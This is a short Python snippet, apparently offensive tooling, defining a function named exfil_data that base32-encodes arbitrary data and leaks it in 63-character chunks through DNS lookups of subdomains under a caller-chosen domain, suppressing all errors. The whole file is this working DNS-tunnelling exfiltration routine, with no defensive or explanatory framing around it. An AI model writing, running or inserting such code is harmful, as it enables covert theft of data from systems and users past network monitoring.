import base64
import socket

def exfil_data(data, domain):
    encoded = base64.b32encode(data).decode()
    for i in range(0, len(encoded), 63):
        subdomain = encoded[i:i+63]
        query = f'{subdomain}.{domain}'
        try:
            socket.gethostbyname(query)
        except:
            pass

